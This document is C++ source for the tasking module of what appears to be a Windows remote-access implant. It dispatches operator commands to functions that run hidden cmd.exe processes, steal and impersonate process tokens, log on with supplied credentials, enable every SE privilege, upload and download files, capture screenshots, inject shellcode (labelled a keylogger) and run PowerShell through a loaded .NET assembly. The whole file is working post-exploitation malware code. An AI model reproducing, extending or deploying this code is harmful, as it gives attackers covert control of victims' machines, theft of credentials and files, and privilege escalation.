#include "Tasking.h"
#include "Helpers.h"
#include "Screenshot.h"
#include "Injection.h"
#include "CLR.h"

std::string ExecuteTasking(State & state, std::string inboundData) {

	TaskingData taskData = DeserializeData(inboundData);
	ResponseData rData;
	rData.returnCode = FunctionalityNotImplemented;

	switch (taskData.taskCode) {
	case Task_StagePowershell:
		state.taskingState.poshScript.clear ();
		state.taskingState.poshScript.shrink_to_fit (); // remove old data
		state.taskingState.poshScript = std::string (taskData.argument1.c_str ());
		rData.returnCode = Success;
		break;
	case Task_Powershell:
		rData = RunPowershell (taskData, state);
		break;
	case Task_GetUID:
		rData = GetUID(taskData, state);
		break;
	case Task_GetPrivs:
		rData = GetPrivileges(taskData, state);
		break;
	case Task_GetPID:
		rData = GetCurrentProcessInformation(taskData, state);
		break;
	case Task_Tasklist:
		rData = GetProcessList(taskData, state);
		break;
	case Task_Idletime:
		rData = GetIdleTime(taskData, state);
		break;
	case Task_Logon:
		rData = LogonAsUser(taskData, state);
		break;
	case Task_RemoveFile:
		rData = RemoveFile(taskData, state);
		break;
	case Task_StealToken:
		rData = StealToken(taskData, state);
		break;
	case Task_DownloadFile:
		rData = DownloadFile(taskData, state);
		break;
	case Task_UploadFile:
		rData = UploadFile(taskData, state);
		break;
	case Task_TCPConnect:
		rData = AttemptTCPConnection(taskData, state);
		break;
	case Task_Dir:
		rData = GetDirectoryListing(taskData, state);
		break;
	case Task_ScreenShot:
		rData = TakeScreenshot(taskData, state);
		break;
	case Task_Shell:
		rData = ExecuteShellCommand(taskData, state);
		break;
	case Task_Keylogger:
		rData = LoadModule(taskData, state);
		break;
	case Task_TargetInfo:
		rData.returnCode = Success;
		rData.rawData = GetTargetInfo(state);
		break;
	case Task_Exit:
		state.running = FALSE;
		break;
	}

	if (state.taskingState.shellOutput.length() > 0)
		rData.extraOutput.append(state.taskingState.shellOutput);

	if (rData.extraOutput.length() > 0)
		rData.extraOutput.append("\n");

	state.taskingState.shellOutput.clear();

	rData.taskID = taskData.taskID;

	return SerializeData(rData, state);
}

DWORD PrepareTasking(State & state) {

	// Fill the hToken with default
	ImpersonateSelf(SecurityDelegation);
	OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, TRUE, &state.taskingState.hToken);

	return true;
}

TaskingData DeserializeData(std::string data) {
	TaskingData taskData;

	PBYTE buffer = (PBYTE)data.data();

	taskData.taskCode = (TaskCode)buffer[0];
	taskData.taskID = *(DWORD *)(data.substr(1, 4).data());

	DWORD arg1Length = *(DWORD *)(data.substr(1 + 4, 4).data());
	taskData.argument1 = data.substr(1 + 4 + 4, arg1Length);

	DWORD arg2Length = *(DWORD *)(data.substr(1 + 4 + 4 + arg1Length, 4).data());
	taskData.argument2 = data.substr(1 + 4 + arg1Length + 4 + 4, arg2Length);

	return taskData;
}

std::string SerializeData(ResponseData data, State & state) {

	std::string serializedData;

	serializedData.append((LPSTR)&data.taskID, sizeof(data.taskID));
	serializedData.append((LPSTR)&data.returnCode, sizeof(data.returnCode));

	DWORD rawDataLength = (DWORD)data.rawData.size();
	serializedData.append((LPSTR)&rawDataLength, sizeof(rawDataLength));
	serializedData.append(data.rawData.data(), data.rawData.size());

	serializedData.append(data.extraOutput.data(), data.extraOutput.size());

	return serializedData;
}

std::string CheckForOutput(State & state) {
	if (state.taskingState.shellOutput.empty())
		return std::string("");
	
	ResponseData rData;

	rData.returnCode = Success;
	rData.taskID = 0xFFFF;

	if (state.taskingState.shellOutput.length() > 0)
		rData.extraOutput.append(state.taskingState.shellOutput);

	if (rData.extraOutput.length() > 0)
		rData.extraOutput.append("\n");

	state.taskingState.shellOutput.clear();

	return SerializeData(rData, state);
}

// Get current process information (arch, pid, name, etc.)
ResponseData GetCurrentProcessInformation(TaskingData &taskData, State & state)
{
	ResponseData rData;
	std::stringstream ss;

	DWORD pid = GetCurrentProcessId();

	ss << "\nPID:  " << pid;
	ss << "\nArch: " << GetProcessArch(pid);
	ss << "\nUser: " << GetProcessUsername(pid);
	ss << "\nPath: " << GetProcessPath(pid);

	rData.returnCode = Success;
	rData.rawData = ss.str();

	return rData;
}

// Get current domain\user
ResponseData GetUID(TaskingData &taskData, State & state)
{
	CHAR username_only[256] = { 0 }, domainname_only[256] = { 0 };
	LPVOID TokenUserInfo[4096];
	DWORD user_length = sizeof(username_only), domain_length = sizeof(domainname_only);
	DWORD sid_type = 0, returned_tokinfo_length;

	ResponseData rData;

	if (!GetTokenInformation(state.taskingState.hToken, TokenUser, TokenUserInfo, 4096, &returned_tokinfo_length)) {
		int t = GetLastError();
		return rData;
	}
		
	if (!LookupAccountSidA(NULL, ((TOKEN_USER*)TokenUserInfo)->User.Sid, username_only, &user_length, domainname_only, &domain_length, (PSID_NAME_USE)&sid_type))
		return rData;

	rData.rawData = std::string(domainname_only) + "\\" + std::string(username_only);
	rData.returnCode = Success;

	return rData;
}

// Attempt to enable all known SE privileges
ResponseData GetPrivileges(TaskingData &taskData, State & state)
{
	LPCWSTR privileges[] = {
		SE_TCB_NAME,
		SE_CREATE_TOKEN_NAME,
		SE_ASSIGNPRIMARYTOKEN_NAME,
		SE_LOCK_MEMORY_NAME,
		SE_INCREASE_QUOTA_NAME,
		SE_DEBUG_NAME,
		SE_UNSOLICITED_INPUT_NAME,
		SE_MACHINE_ACCOUNT_NAME,
		SE_SECURITY_NAME,
		SE_TAKE_OWNERSHIP_NAME,
		SE_LOAD_DRIVER_NAME,
		SE_SYSTEM_PROFILE_NAME,
		SE_SYSTEMTIME_NAME,
		SE_PROF_SINGLE_PROCESS_NAME,
		SE_INC_BASE_PRIORITY_NAME,
		SE_CREATE_PAGEFILE_NAME,
		SE_CREATE_PERMANENT_NAME,
		SE_BACKUP_NAME,
		SE_RESTORE_NAME,
		SE_SHUTDOWN_NAME,
		SE_AUDIT_NAME,
		SE_SYSTEM_ENVIRONMENT_NAME,
		SE_CHANGE_NOTIFY_NAME,
		SE_REMOTE_SHUTDOWN_NAME,
		SE_UNDOCK_NAME,
		SE_SYNC_AGENT_NAME,
		SE_ENABLE_DELEGATION_NAME,
		SE_MANAGE_VOLUME_NAME,
		0
	};

	ResponseData rData;

	rData.rawData = "";
	char buffer[100];

	for (int x = 0; privileges[x]; x++)
	{
		if (EnablePrivilege(privileges[x], state.taskingState.hToken))
		{
			memset(buffer, '\0', sizeof(buffer));
			_snprintf_s(buffer, sizeof(buffer), "%S\n", privileges[x]);
			rData.rawData.append(buffer);
		}
	}

	rData.returnCode = Success;

	return rData;
}

// Return column fixed list of all processes
ResponseData GetProcessList(TaskingData &taskData, State & state)
{
	HANDLE hProcessSnap = NULL;
	PROCESSENTRY32 pe32 = { 0 };
	std::stringstream psResult;
	ResponseData rData;

	do
	{
		hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		if (hProcessSnap == INVALID_HANDLE_VALUE) break;

		pe32.dwSize = sizeof(PROCESSENTRY32);
		if (!Process32First(hProcessSnap, &pe32)) break;

		int widths[7] = { 8, 8, 5, 5, 35, 20, 40 };

		psResult << padStringFromChar("PID", widths[0], ' ')
			<< padStringFromChar("Parent", widths[1], ' ')
			<< padStringFromChar("Arch", widths[2], ' ')
			<< padStringFromChar("Sess", widths[3], ' ')
			<< padStringFromChar("Name", widths[4], ' ')
			<< padStringFromChar("Owner", widths[5], ' ')
			<< padStringFromChar("Path", widths[6], ' ')
			<< "\r\n";

		do
		{
			psResult << std::setw(widths[0]) << std::setfill(' ') << std::left << pe32.th32ProcessID;
			psResult << std::setw(widths[1]) << std::setfill(' ') << std::left << pe32.th32ParentProcessID;
			psResult << std::setw(widths[2]) << std::setfill(' ') << std::left << GetProcessArch(pe32.th32ProcessID);

			DWORD sid = 0;
			if (ProcessIdToSessionId(pe32.th32ProcessID, &sid))
				psResult << std::setw(widths[3]) << std::setfill(' ') << std::left << sid;
			else
				psResult << std::setw(widths[3]) << std::setfill(' ') << std::left << " ";

			char * procName = wchar_to_utf8(pe32.szExeFile);
			psResult << std::setw(widths[4]) << std::setfill(' ') << std::left << procName;
			free(procName);

			psResult << std::setw(widths[5]) << std::setfill(' ') << std::left << GetProcessUsername(pe32.th32ProcessID);
			psResult << std::setw(widths[6]) << std::setfill(' ') << std::left << GetProcessPath(pe32.th32ProcessID);

			psResult << "\r\n";

		} while (Process32Next(hProcessSnap, &pe32));

		rData.returnCode = Success;

	} while (0);

	rData.rawData = psResult.str();
	psResult.clear();

	return rData;
}

// Get time since last user interaction
ResponseData GetIdleTime(TaskingData &taskData, State & state)
{
	LASTINPUTINFO info;
	info.cbSize = sizeof(info);
	HMODULE user32 = NULL;
	BOOL(WINAPI *getLastInputInfo)(PLASTINPUTINFO) = NULL;
	ResponseData rData;

	do
	{
		if (!(user32 = LoadLibrary(L"user32")))
			break;

		if (!(getLastInputInfo = (BOOL(WINAPI *)(PLASTINPUTINFO))GetProcAddress(user32, "GetLastInputInfo")))
			break;

		if (!getLastInputInfo(&info))
			break;
		
		rData.rawData = std::to_string( (GetTickCount() - info.dwTime) / 1000 / 60 );
		rData.returnCode = Success;

	} while (0);

	if (user32)
		FreeLibrary(user32);

	return rData;
}

// Logon as a target user and store the token
ResponseData LogonAsUser (TaskingData &taskData, State & state)
{
	ResponseData rData;

	do
	{
		if ( taskData.argument1 == "revert" )
		{
			if ( state.taskingState.hToken )
				CloseHandle (state.taskingState.hToken);

			RevertToSelf ();

			state.taskingState.impersonating = FALSE;
			state.taskingState.netonly = FALSE;
			state.taskingState.username.clear ();
			state.taskingState.domain.clear ();
			state.taskingState.password.clear ();
			
			ImpersonateSelf (SecurityDelegation);
			OpenThreadToken (GetCurrentThread (), TOKEN_ALL_ACCESS, TRUE, &state.taskingState.hToken);

			rData.returnCode = Success;

			return rData;
		}

		DWORD found = (DWORD)taskData.argument1.find ("\\");

		std::string username, domain, password;
		HANDLE hToken;

		if ( found != -1 )
		{
			domain = taskData.argument1.substr (0, found);
			username = taskData.argument1.substr (found + 1);
		}
		else {
			username = taskData.argument1;
			domain = "";
		}

		DWORD logonType = LOGON32_LOGON_INTERACTIVE;
		DWORD provider = LOGON32_PROVIDER_DEFAULT;

		if ( domain.find ("netonly:") != std::string::npos ) {
			logonType = LOGON32_LOGON_NEW_CREDENTIALS;
			provider = LOGON32_PROVIDER_WINNT50;
			state.taskingState.netonly = TRUE;
			domain = domain.substr (8);
		}

		password = taskData.argument2;

		DWORD result = LogonUserA (username.c_str (),
			domain.c_str (),
			password.c_str (),
			logonType,
			provider,
			&hToken);

		if ( !result ) {
			CloseHandle (hToken);
			break;
		}

		state.taskingState.hToken = hToken;
		state.taskingState.username = username;
		state.taskingState.password = password;
		state.taskingState.domain = domain;
		state.taskingState.impersonating = TRUE;

		ImpersonateLoggedOnUser (state.taskingState.hToken);

		rData.returnCode = Success;

	} while ( 0 );

	return rData;
}

ResponseData RemoveFile(TaskingData &taskData, State & state)
{
	ResponseData rData;

	char expanded[MAX_PATH] = { 0 };
	ExpandEnvironmentStringsA(taskData.argument1.c_str(), expanded, MAX_PATH);

	if (!DeleteFileA(expanded))
		return rData;

	rData.returnCode = Success;

	return rData;
}

ResponseData StealToken(TaskingData &taskData, State & state)
{
	DWORD dwResult = 0;
	HANDLE hPToken = NULL;
	HANDLE hProc = NULL;
	HANDLE hDupToken = NULL;
	DWORD pPid = 0;

	ResponseData rData;

	do
	{
		try
		{
			pPid = atoi(taskData.argument1.c_str());
		}
		catch (...)
		{
			return rData;
		}

		hProc = OpenProcess(MAXIMUM_ALLOWED, FALSE, pPid);
		if (!hProc || hProc == INVALID_HANDLE_VALUE) {
			rData.returnCode = 50;
			break;
		}

		if (!OpenProcessToken(hProc, TOKEN_ALL_ACCESS, &hPToken)) {
			rData.returnCode = 51;
			break;
		}

		if (!DuplicateTokenEx(hPToken, MAXIMUM_ALLOWED, NULL, SecurityDelegation, TokenPrimary, &hDupToken))
			if (!DuplicateTokenEx(hPToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hDupToken))
			{
				rData.returnCode = 52;
				break;
			}

		if (!ImpersonateLoggedOnUser(hDupToken)) {
			rData.returnCode = 53;
			break;
		}

		state.taskingState.hToken = hDupToken;
		rData.returnCode = Success;

	} while (0);

	if (hProc) CloseHandle(hProc);
	if (hPToken) CloseHandle(hPToken);

	return rData;
}

ResponseData DownloadFile(TaskingData &taskData, State & state)
{
	HANDLE hFile = NULL;
	
	ResponseData rData;

	// Expand environment variables
	char expanded[MAX_PATH] = { 0 };
	ExpandEnvironmentStringsA(taskData.argument1.c_str(), expanded, MAX_PATH);

	hFile = CreateFileA(expanded, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (hFile == INVALID_HANDLE_VALUE)
		return rData;

	LARGE_INTEGER fSize;
	if (!GetFileSizeEx(hFile, &fSize))
		return rData;

	DWORD fBytesRead = 0;
	LPVOID dataRead = (LPSTR)malloc((SIZE_T)fSize.QuadPart);

	if (!ReadFile(hFile, dataRead, (DWORD)fSize.QuadPart, &fBytesRead, NULL)) {
		free(dataRead);
		return rData;
	}	

	if (hFile)
		CloseHandle(hFile);

	if (fBytesRead == fSize.QuadPart) {
		rData.rawData = std::string((LPCSTR)dataRead, fBytesRead);
		rData.returnCode = Success;
	}

	free(dataRead);

	return rData;
}

ResponseData UploadFile(TaskingData &taskData, State & state)
{
	HANDLE hFile = NULL;
	ResponseData rData;
	DWORD wSize;

	// Expand environment variables
	char expanded[MAX_PATH] = { 0 };
	ExpandEnvironmentStringsA(taskData.argument1.c_str(), expanded, MAX_PATH);

	hFile = CreateFileA(expanded, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);

	if (hFile == INVALID_HANDLE_VALUE)
		return rData;

	if (!WriteFile(hFile, taskData.argument2.data(), (DWORD)taskData.argument2.size(), &wSize, NULL))
		return rData;

	CloseHandle(hFile);

	if (wSize == taskData.argument2.size()) {
		rData.returnCode = Success;
	}

	return rData;
}

ResponseData AttemptTCPConnection(TaskingData &taskData, State & state)
{
	ResponseData rData;

	LPSTR host = (LPSTR)taskData.argument1.c_str();
	DWORD port;

	try {
		port = atoi(taskData.argument2.c_str());
	}
	catch (...) {
		return rData;
	}

	if (SendTCPData(host, port, NULL, 0)) {
		rData.returnCode = Success;
	}

	return rData;
}

ResponseData GetDirectoryListing(TaskingData & taskData, State & state){
	ResponseData rData;

	DWORD directoryCount = 0;
	DWORD fileCount = 0;
	char *slash = NULL;

	// Expand environment variables
	char expanded[MAX_PATH] = { 0 };
	ExpandEnvironmentStringsA(taskData.argument1.c_str(), expanded, MAX_PATH);
	taskData.argument1 = expanded;

	DWORD attributes = GetFileAttributesA(taskData.argument1.c_str());

	// Make sure string is a directory before 
	if (taskData.argument1.find("*") == std::string::npos && PathIsDirectoryA(taskData.argument1.c_str()) != FALSE)
		taskData.argument1.append("\\*");

	// Find the first file in the directory
	WIN32_FIND_DATAA findData;
	HANDLE hFind = FindFirstFileA(taskData.argument1.c_str(), &findData);
	
	if (hFind == INVALID_HANDLE_VALUE || attributes == INVALID_FILE_ATTRIBUTES)
		return rData;

	rData.rawData = "\r\n";

	if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
	{
		do
		{
			if (!GetFileDetails(findData, &rData.rawData))
				continue;

			if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
				directoryCount++;
			else
				fileCount++;

		} while (FindNextFileA(hFind, &findData) != 0);

		if (GetLastError() != ERROR_NO_MORE_FILES)
			return rData;

		char fileCountString[20] = { 0 };
		char directoryCountString[20] = { 0 };

		_itoa_s(fileCount, fileCountString, 10);
		_itoa_s(directoryCount, directoryCountString, 10);

		rData.rawData.append("\t\t");
		rData.rawData.append(fileCountString);
		rData.rawData.append(" File(s)  \r\n\t\t");
		rData.rawData.append(directoryCountString);
		rData.rawData.append(" Dir(s)");
	}
	else
	{
		if (!GetFileDetails(findData, &rData.rawData))
			return rData;
	}

	FindClose(hFind);
	rData.returnCode = Success;

	return rData;
}

ResponseData TakeScreenshot(TaskingData & taskData, State & state) {

	ResponseData rData;

	DWORD dwBytesWritten = 0;
	std::vector<unsigned char> dataScreen;
	ULONG_PTR gdiplusToken;
	IStream *iStream = NULL;
	IStream *oStream = NULL;
	Gdiplus::Bitmap *pScreenShot = NULL;
	int result = 0;
	LARGE_INTEGER liZero = {};
	ULARGE_INTEGER pos = {};
	STATSTG stg = {};
	ULONG bytesRead = 0;

	do
	{
		Gdiplus::GdiplusStartupInput gdiplusStartupInput;
		GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

		CaptureScreen(dataScreen);

		CreateStreamOnHGlobal(NULL, TRUE, &iStream);
		iStream->Write(&dataScreen[0], (ULONG)dataScreen.size(), &dwBytesWritten);

		if (dwBytesWritten != dataScreen.size())
			break;

		CLSID imageCLSID;
		DWORD quality = 90;
		pScreenShot = new Gdiplus::Bitmap(iStream, TRUE);

		Gdiplus::EncoderParameters encoderParams;
		encoderParams.Count = 1;
		encoderParams.Parameter[0].NumberOfValues = 1;
		encoderParams.Parameter[0].Guid = Gdiplus::EncoderQuality;
		encoderParams.Parameter[0].Type = Gdiplus::EncoderParameterValueTypeLong;
		encoderParams.Parameter[0].Value = &quality;
		GetEncoderClsid(L"image/jpeg", &imageCLSID);

		result = CreateStreamOnHGlobal(NULL, TRUE, &oStream);
		result = pScreenShot->Save(oStream, &imageCLSID, &encoderParams) == 0 ? S_OK : E_FAIL;
		result = oStream->Seek(liZero, STREAM_SEEK_SET, &pos);
		result = oStream->Stat(&stg, STATFLAG_NONAME);

		rData.rawData.resize(stg.cbSize.LowPart);
		result = oStream->Read((LPVOID)rData.rawData.data(), stg.cbSize.LowPart, &bytesRead);

		rData.returnCode = Success;
	} while (0);

	if (oStream) oStream->Release();
	if (iStream) iStream->Release();
	if (pScreenShot) delete pScreenShot;
	Gdiplus::GdiplusShutdown(gdiplusToken);

	return rData;
}

ResponseData ExecuteShellCommand(TaskingData & taskData, State & state) {
	ResponseData rData;

	///
	// 1. Check for some relevant SE permissions
	///

	BOOLEAN impersonatePrivilege = FALSE; // Used for CreateProcessWithTokenW
	if (EnablePrivilege(SE_IMPERSONATE_NAME, state.taskingState.hToken))
		impersonatePrivilege = TRUE;

	BOOLEAN tokenAssignPrivilege = FALSE; // used for CreateProcessAsUser
	if (EnablePrivilege(SE_ASSIGNPRIMARYTOKEN_NAME, state.taskingState.hToken) &&
		EnablePrivilege(SE_INCREASE_QUOTA_NAME, state.taskingState.hToken))
		tokenAssignPrivilege = TRUE;

	///
	// 2. Setup our named pipes for stdin/stdout
	///

	SECURITY_ATTRIBUTES secAttributes;

	ZeroMemory(&secAttributes, sizeof(SECURITY_ATTRIBUTES));
	secAttributes.nLength = sizeof(SECURITY_ATTRIBUTES);
	secAttributes.bInheritHandle = TRUE;
	secAttributes.lpSecurityDescriptor = NULL;

	HANDLE outWritePipe = NULL;
	HANDLE outReadPipe = NULL;

	DWORD bufferSize = 1024 * 8;
	if (!CreatePipe(&outReadPipe, &outWritePipe, &secAttributes, bufferSize))
		return rData;

	///
	// 3. Create our process_info and startup_info structures
	///

	STARTUPINFOW sInfo = { 0 };
	PROCESS_INFORMATION pInfo = { 0 };

	sInfo.cb = sizeof(STARTUPINFOW);
	sInfo.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	sInfo.wShowWindow = SW_HIDE;
	sInfo.lpDesktop = NULL;
	sInfo.hStdOutput = outWritePipe;
	sInfo.hStdError = outWritePipe;


	///
	// 4. Collect LPWSTRs of our variables
	///

	std::string commandLine = "cmd.exe /c " + taskData.argument1;

	LPWSTR commandLineW = utf8_to_wchar(commandLine.c_str());
	LPWSTR usernameW = utf8_to_wchar(state.taskingState.username.c_str());
	LPWSTR domainW = utf8_to_wchar(state.taskingState.domain.c_str());
	LPWSTR passwordW = utf8_to_wchar(state.taskingState.password.c_str());

	///
	// 5. Execute the correct CreateProcess function depending on our situation
	///

	RevertToSelf();

	DWORD result;

	if (state.taskingState.impersonating && impersonatePrivilege)
		result = CreateProcessWithTokenW(state.taskingState.hToken, NULL, NULL, commandLineW, CREATE_NO_WINDOW, NULL, NULL, &sInfo, &pInfo);
	
	else if (state.taskingState.impersonating && tokenAssignPrivilege)
		result = CreateProcessAsUser(state.taskingState.hToken, NULL, commandLineW, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &sInfo, &pInfo);

	else if (state.taskingState.impersonating && !state.taskingState.username.empty())
		if (state.taskingState.netonly)
			result = CreateProcessWithLogonW(usernameW, domainW, passwordW, LOGON_NETCREDENTIALS_ONLY, NULL, commandLineW, CREATE_NO_WINDOW, NULL, NULL, &sInfo, &pInfo);
		else
			result = CreateProcessWithLogonW(usernameW, domainW, passwordW, LOGON_WITH_PROFILE, NULL, commandLineW, CREATE_NO_WINDOW, NULL, NULL, &sInfo, &pInfo);
			
	else
		result = CreateProcess(NULL, commandLineW, NULL, NULL, true, CREATE_NO_WINDOW, NULL, NULL, &sInfo, &pInfo);


	///
	// 6. Re-impersonate our token and clean up our variables
	///

	ImpersonateLoggedOnUser(state.taskingState.hToken);

	// Free our LPWSTRs
	if(commandLineW) free(commandLineW);
	if (usernameW) free(usernameW);
	if (domainW) free(domainW);
	if (passwordW) free(passwordW);

	if (!result)
		return rData;

	///
	// 7. Wait for the process to finish, or the timeout to occur
	///

	if (WaitForSingleObject(pInfo.hProcess, Shell_Timeout) == WAIT_TIMEOUT) {
		TerminateProcess(pInfo.hProcess, 0);
		CloseHandle(pInfo.hProcess);
		CloseHandle(pInfo.hThread);
		CloseHandle(outReadPipe);
		CloseHandle(outWritePipe);
		rData.returnCode = 10;
		return rData;
	}

	CloseHandle(pInfo.hProcess);
	CloseHandle(pInfo.hThread);


	///
	// 8. Read back our output from the stdout named pipe
	///

	rData.rawData = "";

	while (TRUE)
	{
		DWORD dwAvailable = 0;
		DWORD dwRead = 0;
		char buffer[1024];

		if (!PeekNamedPipe(outReadPipe, NULL, sizeof(buffer), NULL, &dwAvailable, NULL))
			return rData;

		if (dwAvailable > 0)
		{
			if (!ReadFile(outReadPipe, buffer, sizeof(buffer), &dwRead, NULL))
				return rData;

			rData.rawData.append(buffer, dwRead);
		}
		else
			break;
	}

	if (outReadPipe) CloseHandle(outReadPipe);
	if (outWritePipe) CloseHandle(outWritePipe);

	rData.returnCode = Success;

	return rData;
}

ResponseData LoadModule(TaskingData & taskData, State & state) {
	ResponseData rData;
	
	SIZE_T shellcodeSize = taskData.argument1.size();
	PVOID shellcode = LocalAlloc(LPTR, shellcodeSize);
	
	CopyMemory(shellcode, taskData.argument1.data(), shellcodeSize);

	if (InjectShellcode(shellcode, (DWORD)shellcodeSize, NULL))
		rData.returnCode = Success;

	return rData;
}


typedef struct PowershellRunData
{
	State * state;
	std::string * command;
} PowershellRunData;

DWORD WINAPI PowershellThread (LPVOID argument) {
	PowershellRunData runData = *(PowershellRunData *)argument;

	std::string output;

	std::string fullCommand = "";

	if ( runData.state->taskingState.poshScript.length () > 0 && !runData.command->empty () )
		fullCommand.append (runData.state->taskingState.poshScript + ";\n");

	fullCommand.append (*runData.command);

	CallMethod (
		runData.state->taskingState.poshHandle,
		"Powershell.Powershell", "Run",
		fullCommand, output
	);

	runData.state->taskingState.shellOutput.append (output);

	return 0;
}

ResponseData RunPowershell (TaskingData & taskData, State & state) {
	ResponseData rData;

	if ( !state.taskingState.poshHandle && !taskData.argument2.empty () ) {
		PVOID handle = LoadAssembly (taskData.argument2);

		if ( !handle )
			return rData;

		state.taskingState.poshHandle = handle;
		rData.returnCode = Success;

	}
	else if ( state.taskingState.poshHandle && !taskData.argument1.empty () ) {

		PowershellRunData runData = {
			&state,
			&taskData.argument1
		};

		DWORD threadID;
		HANDLE hThread = CreateThread (NULL, 0, PowershellThread, &runData, 0, &threadID);

		if ( WaitForSingleObject (hThread, Shell_Timeout) == WAIT_TIMEOUT ) {
			rData.returnCode = 20;
		}
		else {
			rData.returnCode = Success;
			rData.rawData = std::string (state.taskingState.shellOutput);
			state.taskingState.shellOutput.clear ();
		}
	}
	else if ( !state.taskingState.poshHandle )
		rData.returnCode = 30; // Not loaded

	return rData;
}
